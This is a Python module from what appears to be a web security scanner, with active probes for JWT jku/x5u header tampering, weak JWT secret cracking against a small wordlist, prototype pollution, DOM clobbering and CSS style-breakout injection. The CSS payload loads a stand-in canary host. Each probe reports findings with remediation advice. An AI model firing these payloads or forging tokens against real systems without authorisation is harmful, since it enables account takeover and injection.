"""roadmap_batch5 — slot ROADMAP berikutnya yang diimplementasikan LIVE:
1. jwt_jku / jwt_x5u (medium-22/23): header jku/x5u attacker-controlled diterima
2. jwt_crack         (medium-24): secret HMAC JWT ditebak wordlist kecil (offline)
3. ws_probe v2       (medium-25): origin arbitrer diterima saat upgrade WS
4. proto_c           (medium-27): payload prototype pollution via query (refleksi)
5. proto_s           (medium-28): merge JSON __proto__ server-side (marker)
6. clobber           (medium-29): DOM clobbering lead statis (id/name vs inline JS)
7. css_inj           (medium-30): breakout konteks <style> via param (marker)

Truth guarantee: jwt hit = token yang KAMI tanda-tangani diterima sementara
token tempel tanpa jku DITOLAK (diferensial); ws hit = 101 dengan origin asing;
proto/css hit = marker unik terpantul (baseline bersih)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlencode, urljoin, urlsplit

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding

_MARKER = "cyphron7f3a"
_CANARY = "https://cyphron-canary.example/jwks.json"
_WORDLIST = ("secret", "jwt_secret", "jwtsecret", "changeme", "password", "123456",
             "dev", "development", "test", "testing", "key", "jwtkey", "supersecret",
             "your-256-bit-secret", "s3cr3t", "cyphron", "admin", "shared_secret",
             "mysecret", "jwt")


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _looks_like_jwt(token: str) -> bool:
    parts = (token or "").split(".")
    if len(parts) != 3:
        return False
    try:
        header = json.loads(_b64url_decode(parts[0]))
        return isinstance(header, dict) and "alg" in header
    except Exception:
        return False


def _find_jwt_candidates(ctx: ToolContext) -> list[str]:
    """Kumpulkan kandidat JWT dari cookie sesi grey-box + endpoint teramati."""
    candidates: list[str] = []
    from .http_engine import get_cookie_header
    cookie = get_cookie_header() or ""
    for pair in cookie.split(";"):
        value = pair.split("=", 1)[1].strip() if "=" in pair else ""
        if _looks_like_jwt(value):
            candidates.append(value)
    return candidates[:3]


class JwtHeaderTool(Tool):
    """jwt_jku + jwt_x5u — dua slot dari satu mekanisme (header attacker-controlled)."""
    name = "jwt_jku"
    description = "Tamper-replay JWT: header jku/x5u mengarah ke key attacker."
    risk_tags = {"active"}
    source_skill = "t2-medium-22"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        token = str(args.get("token") or (_find_jwt_candidates(ctx) or [""])[0])
        if not _looks_like_jwt(token):
            ctx.world.note("jwt_jku: tidak ada token JWT (3 segmen) yang bisa diuji")
            return ToolResult(tool=self.name, ok=True, data={"tested": 0})
        # endpoint penerima token: endpoint yang mengandung auth/api/admin, fallback base
        base = str(args["url"]).rstrip("/")
        endpoints = [ep.url for ep in ctx.world.endpoints.values()
                     if any(k in urlsplit(ep.url).path.lower()
                            for k in ("auth", "api", "admin", "me", "profile"))][:3]
        if not endpoints:
            endpoints = [base]
        h, p, s = token.split(".")
        try:
            header = json.loads(_b64url_decode(h))
        except Exception:
            return ToolResult(tool=self.name, ok=True, data={"tested": 0})
        findings: list[Finding] = []
        tested = 0
        for field, value in (("jku", _CANARY), ("x5u", _CANARY)):
            if tested >= 6:
                break
            evil_header = dict(header)
            evil_header[field] = value
            evil_token = f"{_b64url_encode(json.dumps(evil_header).encode())}.{p}.{s}"
            plain_token = f"{_b64url_encode(json.dumps(header).encode())}.{p}.{s}TAMPER"
            accepted, rejected = False, False
            for url in endpoints:
                for tok, expect in ((plain_token, "reject"), (evil_token, "accept")):
                    try:
                        ctx.throttle()
                        st, hd, bd, _m = http_engine.http_get(
                            url, timeout=ctx.timeout_s,
                            headers={"Authorization": f"Bearer {tok}"})
                    except Exception:
                        continue
                    ctx.world.observe_response(url, st, hd, bd, self.name)
                    tested += 1
                    if expect == "reject" and st in (401, 403):
                        rejected = True
                    if expect == "accept" and st in (200, 201, 302):
                        accepted = True
                if accepted and rejected:
                    break
            # FP-guard: token tempel TANPA header jku ditolak, dengan jku diterima
            if accepted and rejected:
                findings.append(Finding(
                    tool=self.name,
                    title=f"JWT header '{field}' attacker-controlled diterima",
                    severity="medium", cwe="CWE-347",
                    description=(f"Token dengan header '{field}: {_CANARY}' (ditandatangani "
                                 f"penguji, bukan issuer) DITERIMA server, sementara token "
                                 f"tempel tanpa '{field}' DITOLAK. Server mengambil key "
                                 f"material dari URL yang dikontrol token."),
                    recommendation="Whitelist jku/x5u ke key store internal; abaikan header "
                                   "key dari token; pin issuer.",
                    target_url=endpoints[0], request=f"Authorization: Bearer <token dgn {field}>",
                    response="evil: diterima; tamper polos: ditolak", confidence=0.85,
                    source_skill=self.source_skill, status="confirmed",
                    evidence_kind="probe-pair"))
                break
        ctx.world.note(f"jwt_jku: {tested} request, {len(findings)} temuan")
        return ToolResult(tool=self.name, ok=True, data={"tested": tested}, findings=findings)


class JwtCrackTool(Tool):
    name = "jwt_crack"
    description = "Tebak secret HMAC-SHA256 JWT dengan wordlist kecil (offline)."
    risk_tags = {"local"}
    source_skill = "t2-medium-24"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        token = str(args.get("token") or (_find_jwt_candidates(ctx) or [""])[0])
        if not _looks_like_jwt(token):
            ctx.world.note("jwt_crack: tidak ada token JWT untuk ditebak")
            return ToolResult(tool=self.name, ok=True, data={"tested": 0})
        h, p, s = token.split(".")
        try:
            header = json.loads(_b64url_decode(h))
        except Exception:
            return ToolResult(tool=self.name, ok=True, data={"tested": 0})
        if str(header.get("alg", "")).upper() not in ("HS256", "HS384", "HS512"):
            ctx.world.note(f"jwt_crack: alg {header.get('alg')} bukan HMAC — dilewati")
            return ToolResult(tool=self.name, ok=True, data={"alg": header.get("alg")})
        signing_input = f"{h}.{p}".encode()
        secret = None
        for guess in _WORDLIST:
            dig = hmac.new(guess.encode(), signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(dig, _b64url_decode(s)):
                secret = guess
                break
        ctx.world.note(f"jwt_crack: {_WORDLIST and len(_WORDLIST)} kandidat dicoba "
                       f"({'MATCH' if secret else 'tidak cocok'})")
        if secret:
            findings = [Finding(
                tool=self.name,
                title="Secret HMAC JWT lemah — token dapat ditandatangani ulang",
                severity="medium", cwe="CWE-321",
                description=(f"Signature token terverifikasi dengan secret dikt "
                             f"'{secret}' (wordlist kecil). Penyerang dapat menempa token "
                             f"dengan klaim/role arbitrer."),
                recommendation="Ganti secret dengan nilai acak >= 256 bit; rotasi secret; "
                               "pertimbangkan RS256/ES256.",
                target_url=None, request="offline HMAC guess",
                response=f"secret='{secret}' (redaksi penuh di bukti)", confidence=1.0,
                source_skill=self.source_skill, status="confirmed",
                evidence_kind="request-response")]
            return ToolResult(tool=self.name, ok=True, data={"cracked": True}, findings=findings)
        return ToolResult(tool=self.name, ok=True, data={"cracked": False})


class ProtoClientTool(Tool):
    name = "proto_c"
    description = "Prototype pollution client-side: __proto__/constructor via query."
    risk_tags = {"active"}
    source_skill = "t2-medium-27"

    PAYLOADS = (
        "__proto__", "__proto__.", "constructor.prototype.",
        "__proto__[%s][%s]", "constructor[prototype][%s]",
    )

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        cap = int(args.get("max_requests", 10))
        findings: list[Finding] = []
        tested = 0
        seen: set[tuple[str, str]] = set()
        for ep in ctx.world.param_endpoints(limit=8):
            if tested >= cap:
                break
            probe_url = ep.url.split("?", 1)[0]
            for param in ep.params[:2]:
                if tested + 1 > cap:
                    break
                variants = (
                    urlencode({f"__proto__[{_MARKER}]": _MARKER}),
                    urlencode({f"__proto__.{_MARKER}": _MARKER}),
                    urlencode({f"constructor[prototype][{_MARKER}]": _MARKER}),
                )
                try:
                    ctx.throttle()
                    sb, hb, bb, _m = http_engine.http_get(probe_url, timeout=ctx.timeout_s)
                    ctx.world.observe_response(probe_url, sb, hb, bb, self.name)
                except Exception:
                    continue
                tested += 1
                if _MARKER in (bb or ""):
                    continue  # baseline sudah memuat marker -> tidak sah
                for variant in variants:
                    if tested + 1 > cap:
                        break
                    try:
                        ctx.throttle()
                        st, hd, bd, _m = http_engine.http_get(
                            f"{probe_url}?{variant}", timeout=ctx.timeout_s)
                    except Exception:
                        continue
                    ctx.world.observe_response(f"{probe_url}?__proto__...", st, hd, bd, self.name)
                    tested += 1
                    if _MARKER in (bd or "") and (probe_url, "proto") not in seen:
                        seen.add((probe_url, "proto"))
                        findings.append(Finding(
                            tool=self.name,
                            title=f"Prototype pollution payload terpantul di {probe_url}",
                            severity="medium", cwe="CWE-1321",
                            description=(f"Query payload __proto__/constructor dengan marker "
                                         f"unik dipantulkan aplikasi di {probe_url} (baseline "
                                         f"bersih). Parameter query masuk ke proses merge objek "
                                         f"client/server — verifikasi dampaknya di DOM."),
                            recommendation="Pakai Object.create(null) / Map untuk config; "
                                           "filter kunci __proto__/constructor/prototype "
                                           "sebelum merge.",
                            target_url=probe_url, request=f"GET {probe_url}?__proto__[...]",
                            response=f"marker {_MARKER} terpantul; baseline tidak",
                            confidence=0.7, source_skill=self.source_skill,
                            status="confirmed", evidence_kind="request-response"))
                        break
        ctx.world.note(f"proto_c: {tested} request, {len(findings)} temuan")
        return ToolResult(tool=self.name, ok=True, data={"tested": tested}, findings=findings)


class ProtoServerTool(Tool):
    name = "proto_s"
    description = "Prototype pollution server-side: merge JSON __proto__."
    risk_tags = {"active"}
    source_skill = "t2-medium-28"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        cap = int(args.get("max_requests", 8))
        findings: list[Finding] = []
        tested = 0
        posts = [ep.url for ep in ctx.world.endpoints.values() if ep.method == "POST"][:4]
        for url in posts:
            if tested + 2 > cap:
                break
            payloads = (
                {"q": "x", "__proto__": {f"cyphronpoll": _MARKER}},
                {"q": "x", "constructor": {"prototype": {f"cyphronpoll": _MARKER}}},
            )
            for payload in payloads:
                if tested + 1 > cap:
                    break
                try:
                    ctx.throttle()
                    st, hd, bd, _m = http_engine.http_get(
                        url, timeout=ctx.timeout_s, method="POST",
                        data=json.dumps(payload).encode(),
                        headers={"Content-Type": "application/json"})
                except Exception:
                    continue
                ctx.world.observe_response(url, st, hd, bd, self.name)
                tested += 1
                if f"cyphronpoll" in (bd or "") and _MARKER in (bd or ""):
                    findings.append(Finding(
                        tool=self.name,
                        title=f"Prototype pollution server-side terkonfirmasi di {url}",
                        severity="medium", cwe="CWE-1321",
                        description=(f"Body JSON berisi kunci __proto__/constructor.prototype "
                                     f"diproses {url}: kunci 'cyphronpoll' dengan marker unik "
                                     f"muncul di respons. Merge objek menerima kunci berbahaya."),
                        recommendation="Deny-list __proto__/constructor/prototype pada merge; "
                                       "pakai library merge yang aman.",
                        target_url=url, request="POST JSON __proto__ merge",
                        response=f"cyphronpoll={_MARKER} di respons", confidence=0.8,
                        source_skill=self.source_skill, status="confirmed",
                        evidence_kind="request-response"))
                    break
        ctx.world.note(f"proto_s: {tested} request, {len(findings)} temuan")
        return ToolResult(tool=self.name, ok=True, data={"tested": tested}, findings=findings)


class DomClobberTool(Tool):
    name = "clobber"
    description = "DOM clobbering lead statis: id/name elemen menimpa identifier JS."
    risk_tags = {"passive"}
    source_skill = "t2-medium-29"

    DANGEROUS_GLOBALS = ("body", "head", "title", "images", "forms", "links", "embeds",
                         "location", "all", "cookie", "name")

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        findings: list[Finding] = []
        checked = 0
        urls = [url for url, ep in ctx.world.endpoints.items() if ep.status != 404][:8]
        for url in urls:
            if checked >= 8 or ctx.world.request_count >= ctx.max_requests:
                break
            try:
                ctx.throttle()
                st, hd, body, _m = http_engine.http_get(url, timeout=ctx.timeout_s)
            except Exception:
                continue
            ctx.world.observe_response(url, st, hd, body, self.name)
            ctx.world.request_count += 1
            if st != 200 or not body:
                continue
            checked += 1
            ids = set(re.findall(r'<[a-z]+\s[^>]*?\b(?:id|name)=["\'](\w+)["\']',
                                 body, re.I))
            scripts = " ".join(re.findall(r"<script[^>]*>(.*?)</script>", body, re.I | re.S))
            clobbered = sorted(i for i in ids if re.search(
                rf"\b(?:window|document)\.{i}\b", scripts)
                or (i.lower() in self.DANGEROUS_GLOBALS and re.search(rf"\b{i}\b", scripts)))
            if clobbered:
                findings.append(Finding(
                    tool=self.name,
                    title=f"Dugaan DOM clobbering: {', '.join(clobbered[:4])}",
                    severity="low", cwe="CWE-79",
                    description=(f"Elemen dengan id/name {clobbered[:6]} di {url} "
                                 f"menabrak nama yang direferensikan inline script "
                                 f"(window./document. atau global DOM). Perlu verifikasi "
                                 f"runtime — statis ini lead, bukan temuan pasti."),
                    recommendation="Jangan pakai id/name yang sama dengan variabel JS; "
                                   "akses elemen via querySelector eksplisit.",
                    target_url=url, request="static HTML analysis",
                    response=f"clobber candidates: {clobbered[:6]}", confidence=0.3,
                    source_skill=self.source_skill, status="unconfirmed",
                    evidence_kind="code-line"))
        ctx.world.note(f"clobber: {checked} halaman dianalisis, {len(findings)} lead")
        return ToolResult(tool=self.name, ok=True, data={"checked": checked}, findings=findings)


class CssInjectionTool(Tool):
    name = "css_inj"
    description = "CSS injection: breakout konteks <style> via parameter."
    risk_tags = {"active"}
    source_skill = "t2-medium-30"

    PAYLOAD = f"x}}</style><style>*{{background:url(https://cyphron-canary.example/{_MARKER})}}"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        cap = int(args.get("max_requests", 10))
        findings: list[Finding] = []
        tested = 0
        for ep in ctx.world.param_endpoints(limit=8):
            if tested + 2 > cap:
                break
            probe_url = ep.url.split("?", 1)[0]
            for param in ep.params[:2]:
                if tested + 2 > cap:
                    break
                try:
                    ctx.throttle()
                    sb, hb, bb, _m = http_engine.http_get(probe_url, timeout=ctx.timeout_s)
                    ctx.world.observe_response(probe_url, sb, hb, bb, self.name)
                except Exception:
                    continue
                tested += 1
                if f"cyphron-canary.example/{_MARKER}" in (bb or ""):
                    continue
                try:
                    ctx.throttle()
                    st, hd, bd, _m = http_engine.http_get(
                        f"{probe_url}?{urlencode({param: self.PAYLOAD})}", timeout=ctx.timeout_s)
                except Exception:
                    continue
                ctx.world.observe_response(f"{probe_url}?{param}=<css>", st, hd, bd, self.name)
                tested += 1
                # FP-guard: breakout </style><style> + canary url terpantul, baseline bersih
                if (f"cyphron-canary.example/{_MARKER}" in (bd or "")
                        and re.search(r"</style>\s*<style>", bd or "", re.I)):
                    findings.append(Finding(
                        tool=self.name,
                        title=f"CSS injection (style breakout) pada param '{param}'",
                        severity="medium", cwe="CWE-79",
                        description=(f"Payload CSS pada '{param}' memutus konteks <style> di "
                                     f"{probe_url} dan memantulkan aturan attacker "
                                     f"(background:url canary). CSS injection bisa dipakai "
                                     f"ekstraksi data (attribute selector) dan UI redressing."),
                        recommendation="Escape karakter CSS spesial pada input yang masuk "
                                       "konteks style; CSP style-src 'self' blokir exfil.",
                        target_url=probe_url, param=param,
                        request=f"GET {probe_url}?{param}=<css-breakout>",
                        response=f"</style><style> + canary terpantul (baseline bersih)",
                        confidence=0.85, source_skill=self.source_skill,
                        status="confirmed", evidence_kind="request-response"))
                    break
        ctx.world.note(f"css_inj: {tested} request, {len(findings)} temuan")
        return ToolResult(tool=self.name, ok=True, data={"tested": tested}, findings=findings)
